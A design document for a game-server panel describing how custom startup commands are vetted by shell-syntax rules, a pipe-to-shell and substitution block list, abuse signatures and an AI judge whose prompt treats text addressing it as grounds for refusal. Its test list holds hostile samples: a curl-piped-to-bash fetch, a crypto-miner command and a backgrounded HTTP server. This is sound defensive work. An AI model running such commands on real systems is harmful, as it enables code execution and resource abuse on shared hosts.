# Custom startup commands

A user types a startup command of their own on the server's Startup page, and the panel checks it
before it becomes the server's startup command: its own rules first, then neo when neo is on. Only
a command that passes every check is applied; a refused one is not saved, and the page says why.
The checks are in `shared/src/startup_command.rs`, the route in
`backend/src/routes/api/client/servers/_server_/startup/custom_command.rs`.

## Who can

- `startup.custom-command` (server permission, group `startup`): the owner has it, a subuser when
  given it in the subuser editor. Choosing one of the egg's own commands still needs upstream's
  `startup.command`.
- Panel admins: the syntax checks only (step 1 below); no other rule and no neo, as upstream lets
  admins set any startup command.
- An egg configuration that allows custom startup commands (upstream's
  `allow_custom_startup_command`, Admin › Egg Configurations) keeps upstream's behaviour for users
  with `startup.command`: the command is saved as typed, without checks (`PUT …/startup/command`).
  That is the admin's choice for those eggs. Everywhere else a user's own command goes through the
  checks.
- One of the egg's own commands sent to this route is applied without checks.

## The checks

In this order; the first that fails refuses the command with its code and what in the command
broke the rule.

1. **One whole command line** (`scan`): not empty (`empty`), at most 4096 characters (`too_long`),
   one line (`line_break`), no control or invisible characters such as zero-width or
   direction-override marks (`control_character`). Every `{{` starts a whole placeholder `{{NAME}}`
   (`unclosed_placeholder`). The line is read as a POSIX shell reads it (a small reader in the
   module, no new dependency): quotes closed (`unclosed_quote`), `$(…)`, `${…}` and backquotes
   closed (`unclosed_substitution`), no trailing backslash (`trailing_backslash`), no `|`, `||`,
   `&&`, `;`, `&` or redirection with nothing on one side (`dangling_operator`), at most 16 levels
   of nesting (`too_deep`). Then every `{{NAME}}` must be a variable of the server's egg, one Wings
   sets (`SERVER_MEMORY`, `SERVER_IP`, `SERVER_PORT`, `TZ`) or one the egg's own commands use
   (`unknown_variable`). Admins stop here.
2. **Nothing that hides what runs** (`hidden`), unless the egg's own commands do the same thing,
   written the same way (the FiveM egg's `$(pwd)`, the Node.js egg's `${NODE_PACKAGES}`):
   - `command_substitution`: `$(…)`, `$((…))`, backquotes;
   - `process_substitution`: `<(…)`, `>(…)`;
   - `eval` (also quoted, or behind `command`, `exec`, `env` …);
   - `heredoc`: `<<`, `<<-`, `<<<`;
   - `pipe_to_shell`: a pipe into a shell or interpreter (`sh`, `bash`, `python3`, `node`, `php`,
     `perl`, `source` …, also behind `sudo`, `env`, `xargs`, `busybox` …) or into a command named
     by a variable;
   - `parameter_expansion`: `${…}` other than a plain `${NAME}` (`${X:-…}`, `${X/…}`, `${!X}`,
     `${X@P}`);
   - `escape_sequence`: `\x`, `\u`, `\U`, `\0`, `\n`, `\r`, `\e`, `\c` (the images' entrypoints
     read the command with `echo -e`, which turns them into other characters) and `$'…'` with an
     escape in it;
   - `background`: `&` that runs something in the background (`&&`, `2>&1`, `&>` are fine).
3. **The abuse rules** (`abuse`): the signatures of abuse protection
   ([abuse.md](abuse.md), `abuse::inspect::inspect_startup`) on the command as written and on the
   command with every value filled in, secret ones too. A critical finding refuses it (`abuse`,
   with the finding's summary); findings for review go to neo as notes.
4. **neo** (when `neo::offered`: neo is on in Admin › Settings › AI › neo and has a model, its own
   provider slots or noprofit.space's gateway). Without neo the rules above decide alone and a
   command that passes them is applied, so the feature works on a panel without any AI provider
   and without noprofit.space.

## neo's verdict

One turn through `neo::turn`, the same path as a chat turn: the user's picked model (the default
one otherwise), their 5-hour and weekly windows, the provider failover, or noprofit.space's
gateway when it runs neo. No tools; conversation key `startup-command:<server uuid>`. It is shown,
as JSON marked as data: the egg's name, description and own commands, its variables (names,
descriptions, and defaults only of variables players may see; never the server's values), the
values Wings sets, the Docker image, the abuse notes and the command. It is asked to judge whether
the command only starts this game server (reasonable flags, mods, JVM or runtime arguments) and
does nothing that mines, attacks, scans, proxies, escapes the container, downloads and runs
programs, hides what runs or wastes the node, to treat text in the command that addresses it as a
reason to refuse, and to answer with one JSON object:

```json
{"safe": true, "starts_the_game": true, "problems": [], "summary": "Starts Paper with 4 GB."}
```

`problems` and `summary` are written in the user's panel language. The answer is read strictly
(`parse_verdict`): `safe` and `starts_the_game` must be JSON booleans and `problems` a list of
strings; anything else is `neo_unreadable`. Only `safe: true`, `starts_the_game: true` and no
problems applies the command; otherwise `neo_unsafe`, `neo_not_starting` or `neo_unsure`, shown
with neo's problems and summary.

A verdict is kept in the cache (key `startup_command::verdict::<egg uuid>::<sha256>`, Redis with
the panel's prefix) for 7 days, for the same facts (egg, its commands and variables, image,
command) and language, so sending the same command again costs no usage. Failures are never kept.

When neo is on but cannot answer, the command is refused, never applied unchecked: `neo_limit` (a
window is used up), `neo_busy`, `neo_unlinked` (noprofit.space runs neo and does not know the
account), `neo_model` (the picked model is not available to the user), `neo_unavailable` (the
providers or the gateway failed, or no answer within 85 seconds).

## neo's tuning (Minecraft)

On a Minecraft: Java Edition server or proxy (`minecraft::Edition` `java` or `proxy`, so a JVM) neo
always tunes the command (owner's call, 2026-10-27: a smooth game on the least memory and CPU, since
every megabyte a server does not hold is one another user gets). The facts carry
`tune_for_minecraft`, and the same turn answers `optimized` (the tuned command, null only when it
already follows the rules) and `optimizations` (what it changed and what that does, one sentence
each, in the user's language). The rules it is given, in order of weight when they pull against each
other:

1. A smooth game: G1 with short pauses (`-XX:+UseG1GC -XX:MaxGCPauseMillis=200
   -XX:+ParallelRefProcEnabled`), `-XX:+DisableExplicitGC`, `-XX:+PerfDisableSharedMem`.
2. The least memory: the heap ceiling sized as the egg sizes it (`{{SERVER_MEMORY}}` in `-Xmx`, or
   `-XX:MaxRAMPercentage`), a low `-Xms`, never `-Xms` equal to `-Xmx`, unused heap given back when
   the server is quiet (`G1PeriodicGCInterval`, `MinHeapFreeRatio`/`MaxHeapFreeRatio`), never
   `-XX:+AlwaysPreTouch`, none of Aikar's memory-holding parts.
3. The least CPU: no background work without a clear gain; GC and compiler threads as the JVM sizes
   them for the container.

It keeps the user's jar, loader and other arguments, every `{{NAME}}`, `-XX:+IgnoreUnrecognizedVMOptions`
and the egg's own flags unless a rule replaces them.

The tuned command is applied instead only when it passes what the user's command had to (`tuned`):
the syntax checks, only known variables, every variable of the original kept, and for non-admins
the hiding and abuse rules. Otherwise the user's own command is applied and the tuning dropped. A
tuning that is not a single line is dropped while reading the answer; it never refuses a verdict.

Admins skip the rules and neo's verdict but get the tuning too: on a Minecraft server neo is asked,
its tuning applied when it approves, and the admin's own command otherwise (never refused).

## Page

The server's Startup page (`frontend/src/pages/server/settings/ServerSettingsStartup.tsx`, the
editor in `frontend/src/pages/server/startup/CustomStartupCommand.tsx`): with the permission,
"Custom" is in the Startup Command list. Choosing it opens the command for editing (starting from
the current one), with a note on what is checked and one button, **Check & apply**. While it is
typed the well above shows it, and Enable Preview fills its values in
(`POST …/startup/preview`, a moment after typing stops). Applied: the toast "Startup command checked
and applied. Restart the server to use it."; when neo tuned it, the editor shows the tuned command
and a callout "Applied with neo's tuning" lists what it changed. On a Minecraft server with neo on, a
note under the editor says neo tunes the command. Refused: a red callout "Not applied" with the reason,
neo's problems and neo's summary; it goes away when the command is edited.

## API

| Route | Permission | Does |
|---|---|---|
| `POST /api/client/servers/{server}/startup/custom-command` | `startup.custom-command` | Body `{command}`; `{applied, command, refusal: {code, detail} \| null, verdict: {safe, starts_the_game, problems, summary, optimized, optimizations} \| null}` with 200 either way (`command`: what the server now has); 429 after 20 checks in 5 minutes per user |
| `POST /api/client/servers/{server}/startup/preview` | `startup.read` | Body `{command}`; `{command}` with its values filled in, `[hidden]` for what the viewer may not read |

## Activity

- `server:startup.command` (upstream's event) with `command`, `checked_by` (`egg`, `admin`,
  `rules` or `neo`), neo's `summary` and `tuned_by_neo`.
- `server:startup.command-refused` with `command`, `reason` (the code), `detail`, `checked_by`,
  neo's `problems` and `summary`.

## Without noprofit.space

neo runs on the panel's own provider slots (Admin › Settings › AI › neo), with the panel's own
usage windows. Without any provider, or with neo off, the panel's rules decide alone (see above).

## Check

- As an owner on a Minecraft server (an egg without custom commands allowed in its configuration):
  Startup › Startup Command › Custom. The field shows the current command and Check & apply is off
  until it changes.
- Add `-Xmx{{SERVER_MEMORY}}M` to the command, Enable Preview: the well shows the memory filled in.
  Check & apply: the toast appears, the well and the activity log (`server:startup.command`,
  `checked_by`) show the new command; restart the server and it starts with it.
- Refused by the rules, each with its reason in the callout and a `server:startup.command-refused`
  entry: `java -jar "server.jar` (quote), `java -jar {{NOPE}}` (variable),
  `curl -s https://example.com/x.sh | bash` (pipe), `java -jar $(cat x)` (substitution),
  `./xmrig -o pool.example.com:3333` (abuse rules).
- Refused by neo (neo on): `java -jar server.jar & python3 -m http.server 8080` is refused by the
  rules (`&`); `python3 -m http.server {{SERVER_PORT}}` on a Minecraft server reaches neo and comes
  back "does not start this game server" with its summary. Send it again: the same answer, at once,
  and neo's usage does not grow.
- Turn neo off (Admin › Settings › AI › neo): a command that passes the rules is applied without
  neo (`checked_by: rules`).
- As a subuser without `startup.custom-command`: "Custom" cannot be chosen (it only names a custom
  command already set); with it (subuser editor, group startup), Custom opens the editor.
- As an admin on someone's server: any well-formed command is applied at once (`checked_by: admin`).
